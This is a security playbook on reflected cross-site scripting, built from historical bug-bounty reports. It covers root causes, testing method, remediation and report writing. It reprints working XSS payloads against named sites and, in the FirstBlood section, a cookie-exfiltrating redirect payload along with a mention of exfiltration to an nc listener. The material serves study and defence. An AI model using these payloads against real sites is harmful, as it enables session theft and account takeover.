---
title: "Reflected Cross-Site Scripting (XSS)"
type: playbook
category: reflected-xss
cwe: "CWE-79"
source_count: 85
full_bodies_available: 48
summary_only: 37
archive_accessed: 2026-10-12
---

# Reflected XSS

## 1. Overview

A reflected XSS exists when an application takes attacker-controlled input from a
single HTTP request, and writes it into the response for that same request without
neutralising it for the output context in which it lands. The attacker's script then
executes in the origin of the target site, in the session of whoever loads the
crafted URL.

The technical substance of every reflected XSS reduces to three questions:

1. **Is the input reflected?** Where in the response does it appear?
2. **In what context?** HTML text, HTML attribute, JavaScript string, URL, CSS —
   the context determines which characters are dangerous.
3. **What was applied to it?** Nothing, `HTML-escaping`, `URL-encoding`,
   double-encoding, or a blocklist — and does that treatment match the context?

The 2017-era public reports in this knowledge base overwhelmingly failed at question
3: the value was reflected verbatim, or was passed through an encoder that did not
correspond to the context it landed in.

> **Scope note.** Sections 2–10 are generalised methodology. They are derived from
> the recurring patterns in the cited case studies but are not themselves claims
> about any specific report. Section 11 contains the only report-specific facts, and
> each of those is traceable to a URL in
> [`references/source-index.md`](references/source-index.md).

## 2. Root Cause and Technical Mechanics

The classic reflected flow:

```
attacker crafts URL  →  victim requests it  →  server reflects parameter
                     →  browser parses response  →  script executes in target origin
```

Three distinct root causes account for nearly every case in this archive:

### 2.1 No output encoding at all

The parameter value is concatenated straight into the template. Moneybird's backend
search reflected `search_query` into an HTML attribute without enclosing quotes
([REFL-025](https://hackerone.com/reports/136600)).

### 2.2 Encoding that does not match the context

This is the most instructive and most common failure. The application *did* encode —
but used the wrong encoder, or used HTML encoding in a JavaScript context.

`REFL-056` (Teavana, Starbucks program) is the canonical example. The `LocaleID`
parameter was placed inside a single-quoted JavaScript string literal, and the server
did not escape the single quote:

```js
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
```

The researcher, David Aurelius, stated the cause directly: *"the contents before the
`_CA` are not validated and it will be injected in the response"* — and further noted
that the same primitive yielded an open redirect by controlling `uri`.

`REFL-024` (Mapbox, `api.tiles.mapbox.com`) placed the `access_token` parameter into
an HTML text position. The payload `'.htaccess.aspx'><script>alert(document.domain)</script>`
worked because neither `>` nor `<` was encoded for the HTML context.

### 2.3 Double encoding

`REFL-082` (Rockstar Games, `support.rockstargames.com`) is the one report in this
archive whose *entire* subject is encoding-layer mismatch. The official disclosure
summary states:

> "This exploit worked by using double-encoding to bypass our filters."

The mechanism: a filter decodes the input, finds nothing dangerous, and re-emits the
still-encoded form; the response then delivers the encoded form, which the browser
decodes once more into live markup. Rockstar classified it
`Cross-site Scripting (XSS) - Reflected`, severity `medium`, `$500`,
disclosed 2017-09-01.

> **Author's note — hypothesis, not sourced fact.** The archive does not publish the
> original body for REFL-082 (HackerOne withheld it; only the team summary is
> public). The decode-encode-redecode reasoning above is the standard explanation for
> this bug class and is offered as a testing hypothesis, not as a documented finding.

### 2.4 Why reflection alone is not a vulnerability

Reflection is a *necessary* condition, not a sufficient one. Every entry in this
archive's index that proved not to be exploitable had reflection plus something else
wrong: the value landed inside a text node where `<` was already escaped, or landed
in a context where a quote could not be broken out of, or the CSP genuinely blocked
execution. See §9.

## 3. Attack Surface and Preconditions

Reflected XSS is usually reached through:

- **Query string parameters** — search boxes, filters, category and locale selectors,
  pagination. The single richest source in this archive.
- **Path segments** — `api.tiles.mapbox.com/v4/{map}/page.html`.
- **Fragments** — `LEASEWEB` (`DOM-005`) and `Veris` (`BROW-004`) both read the
  fragment client-side; see [`DOM-Based-XSS.md`](DOM-Based-XSS.md).
- **Marketing/tracking parameters** — `utm_campaign` on `getrush.uber.com`
  (`CONT-126`, `$3,000`) was the entire bug: an unescaped campaign tracker reflected
  into the page.
- **Error pages** — `REFL-068` (Nextcloud, `NC-SA-2017-008`) was the notable
  instance; see §9 for why Nextcloud rated it `low`.
- **Third-party embeds** — `REFL-023` (Livefyre Media Wall on `newsroom.uber.com`,
  `$2,000`) let an attacker point a `lf-content` parameter at their own JSON endpoint,
  which the embed then rendered. The XSS lived in an attacker-hosted origin but
  executed in the trusted one.

**Preconditions in every case:** the victim must load an attacker-controlled link.
That is the defining victim interaction of the class, and the reason real-world
exploitation leans on chat, mail, and link shorteners.

## 4. Manual Testing Methodology

1. **Map inputs first.** For each request, enumerate query, path, and cookie inputs.
   Reflected XSS lives in GET-reachable, unauthenticated, link-shareable surfaces, so
   prioritise those.
2. **Confirm reflection.** Use a unique inert marker (`H1XSSMARKER9`) and locate it in
   the raw response with `grep`, then in the rendered DOM with DevTools search. If the
   marker is absent, stop — there is no reflected XSS here.
3. **Determine context before choosing a payload.** Inspect the byte immediately
   before and after the marker. This single step prevents most wasted effort.
4. **Neutralise the context, not the whole document.** Prefer the smallest character
   needed to escape the specific context.
5. **Escalate from inert to executable in two stages.** First prove markup control
   with a harmless tag (`<h1>` / `<marquee>`), then prove script execution. Report both
   stages; many programs accept markup injection at lower severity and full script
   execution at higher.
6. **Record the exact reflection point.** Quote the raw response snippet in the report.

Two case studies demonstrate stage 1 and stage 2 handled properly, and both are
worth reading as models:

- `179426` (Blockchain) used only `<h1>XSS here` and `<marquee>XSS here`. The
  researcher explicitly noted that a strict CSP blocked arbitrary script and declined
  to overclaim: *"arbitrary javascript cannot be executed through this vulnerability
  without some CSP bypass."*
- `136600` (Moneybird) used `search_query=test" onclick=alert(document.domain)` —
  a single quote plus an event handler — and explained precisely why: *"the searchvalue
  is not enclosed in Quotes… so it is possible to inject any eventhandler."*

## 5. Input and Output Context Analysis

| Context | Dangerous characters | Correct control | Observed failure in this archive |
| --- | --- | --- | --- |
| HTML text node | `<` `>` | `&lt;` `&gt;` | `REFL-024`, `REFL-078` |
| HTML attribute (quoted) | `"` `'` | `&quot;` `&#39;` | `REFL-025` (unquoted attr) |
| HTML attribute (unquoted) | space, `>`, `` ` ``, `=`, `/` | quote the attribute **and** escape | `REFL-025` |
| JS string (single-quoted) | `'` `\` newline | `JSON.stringify` / `\u0027` | `REFL-056` |
| JS string (double-quoted) | `"` `\` newline | `JSON.stringify` | — |
| URL / `href` | `javascript:`, `data:`, whitespace | scheme allow-list | `CONT-057`, `BROW-008` |
| Comment | `--` `>` | strip comments server-side | — |

`REFL-025` is worth dwelling on because it shows the difference between *escaping*
and *quoting*. The value was not escaped, but the defect that mattered was that the
attribute was **unquoted** — so a space alone terminates the attribute value and any
subsequent token becomes a new attribute. Adding quotes would have neutralised the
payload without any escaping at all.

`CONT-057` (Twitter, `unsafe_link_warning`, `$1,400`) is the URL-context case:
`unsafe_link` was reflected into markup and the payload
`http://example.com onmouseover=alert(1) style=font-size:100pt` broke out with an
unquoted event handler. The researcher noted it was *"blocked by CSP"* in Firefox and
Chrome and demonstrated it in IE only.

`BROW-008` (Shopify, `$800`) is the URL-context case with a trust twist: a malicious
embedded app set a button `href` to a `javascript:` URL, which executed in the **store
admin's** session. See
[`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md).

## 6. Test Cases and Proof-of-Concepts

### 6.1 Historical payloads (verbatim from the cited reports)

These are reproduced exactly as the original researchers submitted them, for
understanding. **Do not fire these at production targets.**

| Case | Report | Payload as submitted |
| --- | --- | --- |
| REFL-056 | `190798` | `LocaleID=eas';alert(document.cookie);//an_CA` |
| REFL-024 | `135217` | `access_token=...htaccess.aspx'><script>alert(document.domain)</script>` |
| REFL-025 | `136600` | `search_query=test" onclick=alert(document.domain)` |
| REFL-078 | `230119` | `category="--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>` |
| CONT-126 | `125112` | `utm_campaign=tttttt'%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E` |
| CONT-057 | `53098` | `unsafe_link=http://example.com onmouseover=alert(1) style=font-size:100pt` |

### 6.2 Newly authored illustrations (not from the archive)

These are generic, written for this playbook, and use inert markers by design.

Context-probe markers — confirm reflection and locate the context without
introducing script:

```
H1XSSMARKER9
"><h1>xss-marker
'><svg onload=alert(1)>          ← attribute break-out
';alert(document.domain);//       ← single-quoted JS string break-out
");alert(document.domain);//      ← double-quoted JS string break-out
javascript:alert(1)//             ← URL / href context
```

Escalation ladder — test in this order, stop at the first rung that works, and report
the highest rung you reached:

| Rung | Test | Establishes |
| --- | --- | --- |
| 0 | `H1XSSMARKER9` | reflection exists |
| 1 | `"><h1>xss-marker` | markup control |
| 2 | `"><img src=x onerror=alert(1)>` | attribute/event-handler injection |
| 3 | `</script><svg onload=alert(1)>` | tag/context break-out |
| 4 | read a same-origin secret | confirmed origin-level impact |

**Safe proof preference.** Rung 4 — reading a same-origin value such as
`document.domain`, or setting a marker on a page you control — is far stronger
evidence than a bare `alert(1)` and is much less likely to disrupt the target. Several
researchers in this archive used `document.domain` or `document.cookie` rather than a
bare alert for exactly that reason.

## 7. Encoding, Filtering, and Parsing Behavior

The 2017 reports document four distinct filtering strategies and three distinct ways
each failed:

1. **No filtering.** `REFL-056`, `REFL-024`, `CONT-126`.
2. **HTML-escaped, wrong context.** Escaping `<`/`>` inside a JavaScript string does
   nothing about `'`, so the string can still be terminated. `REFL-056`.
3. **Incomplete blocklist.** Two Rockstar reports show how a blocklist fails on
   near-miss characters. In `STOR-142` the team's own words: *"we were not filtering
   ＜ and ＞ characters the same as `<` and `>`."* In `STOR-143`: *"certain obscure
   characters were not being converted to HTML entities properly."* Both are in
   [`Stored-XSS.md`](Stored-XSS.md) but the lesson is identical for reflected input.
4. **Double encoding.** `REFL-082`.

`REFL-017` (Shopify `wholesale.shopify.com`) shows a researcher proposing a fix that
is **not recommended today**: *"I suggest to convert them either to hex values or
escape them."* Hex-encoding is a blacklist-shaped answer. Prefer a vetted
context-appropriate encoder, applied at the point of output, for every value, always.

> **Note.** These sources are from 2017 or earlier. Browser parsing has changed
> substantially since — notably the removal of Flash, the near-universal adoption of
> `Content-Security-Policy`, and the closing of many legacy IE-specific parser quirks.
> Behaviour that depended on IE is flagged in §9.

## 8. Impact and Severity Considerations

Impact is determined by the **origin** in which the script executes, not by the
payload. An XSS on `support.rockstargames.com` inherits the trust users place in
Rockstar's support domain even where no sensitive cookie exists.

Recorded severities from the archive, quoted as published:

| Report | Program | HackerOne severity | Bounty |
| --- | --- | --- | --- |
| `246505` REFL-082 | Rockstar Games | medium | $500 |
| `230119` REFL-078 | Zomato | medium | not disclosed |
| `216812` REFL-068 | Nextcloud | low | $450 |
| `190798` REFL-056 | Starbucks | medium | not disclosed |
| `179426` HTML-008 | Blockchain | medium | not disclosed |

`REFL-068` deserves attention as a **severity-restraint model**. Nextcloud's own
disclosure gives **CVSS v3 3.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)**, CWE-79,
**low** — and explains why:

> "Nextcloud employs a strict Content-Security-Policy preventing exploitation of this
> XSS issue on modern web browsers."

The researcher had already conceded the same point, writing that "inject scripts or
redirect to another websites is difficult" given the headers in place. The bounty was
still paid. Accurate impact statements survive triage; inflated ones do not.

Two escalation factors recur and are worth stating in any report:

- **Admin panels.** `REFL-068`'s same flaw class in an admin panel is materially more
  severe than in a public page.
- **Session cookie value.** Where no session cookie exists on the vulnerable origin,
  say so plainly. The `191380` researcher volunteered exactly this, noting
  *"ton.twitter.com has no valuable cookies at all so the impact will be a phishing
  page"* — an honest self-limiting statement that should be copied, not hidden.

## 9. False Positives and Limitations

Disciplines the archive itself demonstrates.

**Reflection is not XSS.** Confirm the reflection is in an *executable-capable*
position. Reflection inside a properly escaped text node is not a finding.

**CSP genuinely blocking execution.** `179426` (Blockchain) reported a strict CSP that
"even blocks 'self'" and explicitly declined to claim script execution. `53098`
(CONT-057) reported the bug as IE-only and noted CSP protection elsewhere. Reporting
the limitation *raised* credibility in this archive rather than lowering it.

**The Nextcloud case — headers as mitigation, not as excuse.** `REFL-068` is instructive
because Nextcloud chose to both fix the escaping *and* publish the CSP mitigation. The
researcher's framing is worth reusing: headers reduce exploitability, they do not
remove the defect, and "not all browsers support these headers."

**Non-persistent, non-fatal.** Reflected XSS does not survive the request. Do not
claim persistence.

**Browser and era caveats.** Several reports depend on Internet Explorer specifically:
`REFL-001` (Slack, `slack.com/go/...`, `$150`) states *"can be reproduce in IE"*;
`CONT-057` required IE; `HTML-012` (`200826`) supplied a *separate* PoC "for Internet
Explorer (using X-UA-Compatible IE=9)" alongside a Chrome/IE HTML-injection PoC. Do not
assume 2017 IE-specific parser behaviour still applies. Verify on a current browser
before reporting, and if you cannot, state the constraint.

**Rate of non-reproduction in this archive.** Of 910 XSS-titled archive entries, 299
were no longer publicly retrievable at research time. Where only an official summary
was available, this playbook records the summary and marks the missing fields rather
than inferring them.

## 10. Remediation and Regression Testing

### 10.1 Remediation, by context

| Context | Fix |
| --- | --- |
| HTML text | HTML-encode `& < > " '` at output |
| HTML attribute | Prefer never building attributes from concatenation; use a DOM API. Otherwise encode `& < > " '` |
| JavaScript string | Do **not** hand-roll. Set via `textContent`, or `JSON.stringify()` the value into a `<script type="application/json">` block and parse it |
| URL / `href` | Scheme allow-list (`https:`, `http:`, `mailto:`). Reject `javascript:`, `data:`, `vbscript:` after decoding, trimming whitespace and control characters |
| Anywhere | Validate input against an expected *shape* (format, regex, enum) — but never as a substitute for output encoding |

Fix at the point of output, for every value, unconditionally. Centralised, well-audited
encoding helpers are what actually hold; ad-hoc per-field fixes do not.

### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| For every user-controlled output point, submit a context-breaking payload and assert the *escaped* form appears | encoding is present |
| Assert the payload never appears in the response in raw `<`/`>`/`'`/`"` form | no raw reflection |
| Assert the response is not reflected into any `<script>` block unescaped | JS-context safety |
| Assert `href`/`src` reject `javascript:` and `data:` | URL-context safety |
| Assert response carries a CSP without `unsafe-inline` | defence in depth |
| Assert cookies on authenticated paths are `HttpOnly` + `Secure` + `SameSite` | limits session theft |

### 10.3 CSP as defence in depth, not the fix

`179426` and `REFL-068` both show CSP meaningfully reducing real-world impact. Neither
treats it as a remedy for the escaping defect, and neither should a report or a fix.

## 11. Historical Bug Bounty Case Studies

Each subsection below states only what the cited source states. Fields the source does
not disclose are marked as such. Full inventory:
[`references/source-index.md`](references/source-index.md).

---

### REFL-082 — Reflected XSS via Double Encoding

- **Program:** Rockstar Games · **Report:** <https://hackerone.com/reports/246505>
- **Archive listing:** <https://h1.security.nathan.sx/rockstargames.html>
- **Published:** 2017-07-06 · **Disclosed:** 2017-09-01
- **Weakness (HackerOne):** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** medium (author: Team) · **Bounty:** $500 · **Votes:** 22
- **Affected asset (structured scope):** `support.rockstargames.com` (asset type `URL`)
- **Body inspected:** No — withheld by HackerOne. Evidence level: **partial report**.

Official team disclosure summary, verbatim:

> "The researcher found a Reflected XSS vulnerability in the search query on
> support.rockstargames.com. This exploit worked by using double-encoding to bypass
> our filters. With the researcher's help we were able to resolve this vulnerability."

- Affected parameter: the **search query**. Not further disclosed.
- Reproduction: not disclosed in the accessible source.
- Remediation: "resolve this vulnerability" — no technical detail disclosed.
- **Why it matters here:** the only report in the archive whose entire subject is an
  encoding-layer mismatch, and therefore the anchor case for §7.

---

### REFL-056 — Reflected XSS on teavana.com (Locale-Change)

- **Program:** Starbucks · **Report:** <https://hackerone.com/reports/190798>
- **Archive listing:** <https://h1.security.nathan.sx/starbucks.html>
- **Published:** 2016-12-13 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity:** medium · **Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Affected feature:** `Locale-Change`, parameter `LocaleID`, on `teavana.com` — a
Demandware storefront.

**Input-to-output flow (from the submitted raw response):** the value is embedded in a
single-quoted JavaScript string literal:

```js
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
uri = decodeURIComponent(uri);
if (uri.indexOf("/ca/en") >= 0) { uri = uri.replace("/ca/en", ""); }
else if (uri.indexOf("/ca/fr") >= 0) { uri = uri.replace("/ca/fr", ""); }
window.location = uri;
```

**Root cause, in the researcher's words:** "This injection is possible because the
contents before the `_CA` are not validated and it will be injected in the response."
The single quote is not escaped for the JS-string context it lands in.

**Reproduction (as submitted):**
```
GET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas';alert(1);//dasdsan_CA
Host: www.teavana.com
```

**Impact as claimed:** execution in the `teavana.com` origin; the researcher noted the
same primitive "can also be modified to easily make an open redirect" by controlling
the `uri` value that is finally passed to `window.location`.

**Limitations:** no bounty figure, no remediation detail, and no confirmation of
reproduction recorded in the accessible source.

---

### REFL-025 — Reflected XSS in Backend search

- **Program:** Moneybird · **Report:** <https://hackerone.com/reports/136600>
- **Archive listing:** <https://h1.security.nathan.sx/moneybird.html>
- **Published:** 2016-05-05 · **Weakness:** `Cross-site Scripting (XSS) - Generic`
- **Severity / Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Root cause, in the researcher's words:** "This is possible, because the searchvalue
is not enclosed in Quotes… so it is possible to inject any eventhandler into the html
code." The `search_query` value is rendered into an **unquoted HTML attribute**.

**Reproduction (as submitted):**
1. Enable "view invoices online" and create an invoice containing a known word — this
   reveals the account ID needed to build the URL. The researcher flagged this
   dependency explicitly: *"this is just to see the id of the account to craft the
   payload. Maybe you can also find this number anywhere else…"*
2. Request:
   `https://moneybird.com/[id]/search?search_query=test" onclick=alert(document.domain)`
3. Click the search result — the alert fires.

**Preconditions:** an authenticated Moneybird account is required to reach backend
search; the attacker needs the victim's numeric account ID.

**Impact as claimed:** "the worst thing that you can do with this vulnerability, is to
redirect a moneybird user to a phishing page where he is prompted to enter his login
credentials, or an attacker could even add himself to the admins of the account and
take it over completely."

**Why it matters here:** the cleanest available demonstration that *quoting an
attribute* is itself a security control, independent of escaping.

---

### REFL-078 — Reflected XSS in Zomato Mobile — category parameter

- **Program:** Zomato · **Report:** <https://hackerone.com/reports/230119>
- **Archive listing:** <https://h1.security.nathan.sx/zomato.html>
- **Published:** 2017-05-20 · **Weakness:** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** medium · **Bounty:** Not disclosed in the source
- **Body inspected:** Yes. Evidence level: **full report**.

**Affected feature:** the `category` query parameter on restaurant photo pages,
reachable only when the request presents a **mobile user agent** (iPhone/Android).

**Preconditions / victim interaction:** victim must be on a mobile user agent and load
the crafted link.

**Reproduction (as submitted):**
```
https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E
```

**Root cause:** the value is reflected into a position where `"` closes the surrounding
attribute and `</script>` terminates a preceding `<script>` block, after which a fresh
`<svg onload=...>` element executes.

**Limitations:** no remediation detail, bounty, or fix confirmation in the accessible
source.

---

### REFL-024 — Reflected XSS on api.tiles.mapbox.com

- **Program:** Mapbox · **Report:** <https://hackerone.com/reports/135217>
- **Archive listing:** <https://h1.security.nathan.sx/mapbox.html>
- **Published:** recorded in the team summary as 2016-04-28 · **Severity:** Not
  disclosed · **Bounty:** $1,000 · **Body inspected:** Yes — **full report**.

**Affected feature:** the `access_token` query parameter on the v4 map embed page at
`api.tiles.mapbox.com`.

**Reproduction (as submitted):**
```
http://api.tiles.mapbox.com/v4/ctswebrequest.m4ga59jd/page.html?access_token=
[REDACTED_SECRET]
.htaccess.aspx'><script>alert(document.domain)</script>#11/39.9168/-75.1595
```

**Program's own summary, verbatim:** "On April 28th, 2016 @dawgyg reported a
reflected cross-site scripting issue in the map embed page of our v4 map API that
**affected Firefox users only**. An attacker could manipulate the `access_token` query
string parameter on `api.mapbox.com` or `api.tiles.mapbox.com` to inject arbitrary
JavaScript that would then execute in the context of the page."

**Value as a case:** a published disclosure that scopes the finding to a single browser
rather than asserting universal exploitability — the restraint described in §9.

---

### REFL-068 — Reflected XSS in error pages (NC-SA-2017-008)

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/216812>
- **Advisory:** <https://nextcloud.com/security/advisory/?id=nc-sa-2017-008>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Published:** 2017-03-28 · **Weakness:** `Cross-site Scripting (XSS) - Reflected`
- **Severity:** low · **Bounty:** $450 · **Body inspected:** Yes — **full report**.

**Researcher's reported PoC:**
```
https://nextcloud-site/index.php/apps/files/ajax/download.php?files=%00&dir=</p>HTMLCODE
```
The reporter described the underlying class as *"an HTML injection vulnerability … flaw
in the Nextcloud (and Owncloud) latest version"* and framed impact as phishing and
simulated login screens against logged-in users.

**Program's official advisory summary, verbatim:**

> **Risk level:** Low
> **CVSS v3 Base Score:** 3.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)
> **CWE:** Improper Neutralization of Input During Web Page Generation
> ('Cross-site Scripting') (CWE-79)
>
> **Description:** Inadequate escaping of error messages leads to XSS vulnerabilities
> in multiple components.
>
> Note that Nextcloud employs a strict Content-Security-Policy preventing exploitation
> of this XSS issue on modern web browsers.
>
> **Affected Software:** Nextcloud Server < 11.0.3 (CVE-2017-0891); < 10.0.5
> (CVE-2017-0891); < 9.0.58 (CVE-2017-0891)

**Why it matters here:** this is the archive's only XSS case with a fully published
CVSS vector string, a CWE identifier, an advisory, and CVE assignments — all four
traceable to the source. See [`Stored-XSS.md`](Stored-XSS.md) for the sibling advisory
`NC-SA-2017-007` (`DOM-015`).

---

### Supporting reflected sources

Retrieved with full bodies and available for follow-up, cited by case ID in
[`references/source-index.md`](references/source-index.md):

- **REFL-001** `2497` — <https://hackerone.com/reports/2497> — Slack, `$150`.
  *"can be reproduce in IE"*. IE-scoped reflection in a `slack.com/go/` path segment.
- **REFL-023** `134061` — <https://hackerone.com/reports/134061> — Uber Newsroom,
  `$2,000`. Third-party Livefyre embed renders attacker-hosted JSON: the XSS lives in
  the embed's origin, executed in the trusted one.
- **HTML-008** `179426` — <https://hackerone.com/reports/179426> — Blockchain,
  medium. CSP-scoped, reporter-declined script execution; includes an explicit
  remediation recommendation (encode, or whitelist the URL with a strict regexp).
- **CONT-126** `125112` — <https://hackerone.com/reports/125112> — Uber getrush,
  `$3,000`. Unescaped `utm_campaign` marketing parameter; team summary: *"Reflected
  XSS … due to not escaping certain tracking parameters."*

### FirstBlood hackevent cases (BugBountyHunter.com · 2021-2023)

All catalogue in [`references/firstblood-index.md`](references/firstblood-index.md).

- **FB-119** — <https://www.bugbountyhunter.com/hackevents/report?id=119> — FirstBlood
  v1 · **P3 Medium** · FirstBlood ID 14. ``login.php?goto=javascript:confirm``;`` — the
  redirect fires only after a successful login, which the PoC documents
  (*"Enter Valid Credentials"* → *"Tap on login"*). Seed: *"fails to filter the
  javascript URI upon redirecting"*.
- **FB-122** — report 122 — v1 · **P3 Medium**. A WAF exists but *"it's only looking
  for certain HTML tags and event handlers"* —
  ``"><marquee onstart=confirm`1`>XSS</marquee>`` rides an unwrapped tag plus an
  uncommon handler.
- **FB-150** — report 150 — v1 · **P3 Medium** · FirstBlood ID 3. Reflected → ATO
  chain on `?ref=`: *"It only needs one single click from the victim to fire… I was
  also able to takeover the victim's account by stealing cookies"* — the payload
  ``ja%0avascript:window.location.href=`http://localhost/${document.cookie}` `` moves
  the cookie out on the redirect click. Bypass anatomy and the BBH-001 probes live in
  [`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md).
- **FB-131** — report 131 — v1 · **P3 Medium**. Same `?ref=` surface with a
  double-encoded XHR exfil: `ja%0Dvascript:eval%2528'…'` — needs the *"return to
  previous page"* click; cookie lands on the attacker's `nc` listener.

### BBH-001 — Reflection-discovery flow (BugBountyHunter.com methodology, read in full)

Source: <https://www.bugbountyhunter.com/vulnerability/?type=xss>.

- **Confirm control in `view-source:` *and* Inspect Element:** *"one web application
  makes another request to /api/user/settings and appends the response in the DOM.
  You won't see your information via view-source, but you will via Inspect Element…
  Use both approaches when checking for your reflection."*
- **Build the parameter word list** from raw HTML (`<input id='param1'
  name='param1'>`), JS files (*"look for var ="*), and brute-forcing known names
  (*"such as returnUrl"*) — then exploit re-use: *"I can not stress enough how much
  large companies re-use code & parameter names across lots of endpoints."*
- **Headers are inputs too:** *"Check all parameters/headers (such as Referrer or
  even User-agent, think web cache poisoning!). Don't forget to fuzz for common
  parameter names."*
- **Input everywhere:** payloads in names, e-mails (*"test+<h2>@test.com"*), bios;
  start *harmless* (`<h2>`) — *"Don't use the most common <script>… start with
  something 'harmless' such as <h2>"*.
- **Redirect-parameter name list** from the open-redirect guide
  (<https://www.bugbountyhunter.com/vulnerability/?type=open_redirect>, core section
  read): `go`, `return`, `r_url`, `returnUrl`, `returnUri`, `locationUrl`, `goTo`,
  `return_url`, `return_uri`, `ref=`, `referrer=`, `backUrl`, `returnTo`,
  `successUrl`. Matches the corpus's `goto`/`ref` XSS above; and the guide's
  warning on redirect surfaces: filtering is usually *"relatively easy to bypass"*.

## 12. Professional Vulnerability Report Template

````markdown
# Reflected XSS in <feature> via <parameter>

## Summary
One paragraph: the input, the context, and the consequence. Name the origin.

## Severity
<high|medium|low> — <one sentence justifying, accounting for CSP and cookie flags>

## Affected endpoint
`GET https://<host>/<path>?<param>=<value>`
Program: <name> · Asset: <host> · Date: <YYYY-MM-DD>

## Vulnerability details
<feature name and what it does; where <parameter> is consumed>

### Input-to-output flow
<attacker-controlled input> -> <server handling> -> <output context in the response>

### Root cause
<why the control present is absent or mismatched to the context>

## Proof of concept
### Step 1 — confirm reflection (inert)
```
https://<host>/<path>?<param>=H1XSSMARKER9
```
> Marker found in response at byte offset <N>, context: <HTML text | attribute | JS string | URL>.

### Step 2 — markup control (harmless)
```
https://<host>/<path>?<param>="><h1>xss-marker
```
> Result: `<h1>` renders as an element.

### Step 3 — script execution
```
https://<host>/<path>?<param>=...
```
> Result: `document.domain` reads `<origin>`, proving execution in the target origin.

### Raw response excerpt
```
<the relevant snippet, with the reflection highlighted>
```

## Remediation
<context-appropriate control; see §10.1>

## References
<advisory / CVE / prior art, with URLs>
````

**Reporting discipline.** State the browser you tested and the date. Disclose CSP
honestly, in both directions. Include the required preconditions rather than omitting
them. Use `document.domain` rather than a bare alert where you can. Do not claim
persistence.

## 13. References

- OWASP Cheat Sheet — Cross Site Scripting Prevention: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP Cheat Sheet — DOM based XSS: <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Based_XSS_Cheat_Sheet.html>
- OWASP Cheat Sheet — Input Validation: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- PortSwigger — Cross-site scripting cheat sheet: <https://portswigger.net/web-security/cross-site-scripting/cheatsheet>
- MDN — HTML Living Standard, scripting contexts: <https://developer.mozilla.org/en-US/docs/Web/HTML>
- Nextcloud advisory NC-SA-2017-008: <https://nextcloud.com/security/advisory/?id=nc-sa-2017-008>
- CVE-2017-0891 (as published in that advisory): <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0891>
- Primary reports cited: <https://hackerone.com/reports/246505>,
  <https://hackerone.com/reports/190798>, <https://hackerone.com/reports/136600>,
  <https://hackerone.com/reports/230119>, <https://hackerone.com/reports/135217>,
  <https://hackerone.com/reports/216812>, <https://hackerone.com/reports/179426>,
  <https://hackerone.com/reports/2497>, <https://hackerone.com/reports/134061>,
  <https://hackerone.com/reports/125112>

## 14. Research Gaps and Further Investigation

- **`REFL-082` (Rockstar double-encoding) body withheld.** The specific
  double-decode mechanism is a hypothesis here. Finding the full report would let §7
  move from hypothesis to sourced fact.
- **299 archive titles were no longer publicly retrievable** at research time. Several
  are titled as reflected XSS and would likely strengthen §2–§7. They are recorded as
  title-only in [`references/source-index.md`](references/source-index.md).
- **No post-2017 evidence.** Every source predates the removal of Flash and the
  mainstreaming of strict CSP. Current exploitability of each case has not been
  re-tested and should not be assumed. Modern DOM sinks (`document.write`,
  `innerHTML`, framework renderers) are under-represented relative to their current
  prevalence — see [`DOM-Based-XSS.md`](DOM-Based-XSS.md).
- **Severity calibration.** The archive mixes HackerOne severity ratings, CVSS vectors,
  and raw bounty figures. A cross-program severity comparison is not supportable from
  this data and has not been attempted.
- **Worth investigating with fresh sources:** mutation-based context detection
  (whether the reflection point tolerates `'`, `"`, `<`, `>`, and backtick independently);
  and CSP-bypass-assisted severity reassessment for the reports rated `low` because of
  a CSP that has since changed.
